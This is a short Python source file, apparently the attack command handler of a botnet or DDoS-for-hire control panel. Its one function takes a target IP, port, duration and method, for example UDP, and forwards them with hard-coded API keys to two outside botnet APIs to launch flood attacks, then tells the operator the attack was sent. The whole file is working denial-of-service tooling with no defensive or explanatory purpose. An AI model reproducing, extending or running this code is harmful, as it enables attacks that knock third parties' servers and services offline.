import os, sys, time, requests

from ..utils.main import *


def temporary_attack(socket, argv):
    if len(argv) == 5:
        ip = argv[1]
        port = argv[2]
        time = argv[3]
        method = argv[4]
        socket.send("Sending attac, please wait....".encode())
        send = requests.get(f"https://primacyapi.net/client/botnet/api.php?key=RDiPTNVewIpkHNYN&host={ip}&port={port}&time={time}&method={method}").text
        send2 = requests.get(f"https://gamma-api.cc/panel/api/api.php?key=76DNgR7VD9j5sux8&host={ip}&port={port}&time={time}&method={method}").text
        print(send)
        print(send2)
        socket.send(f"Attack sent to: {ip}:{port} for {time} seconds with {method}\r\n".encode())
    else:
        socket.send(f"[x] Error, Invalid Argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExmaple: attack 5.5.5.5 80 300 UDP\r\n".encode())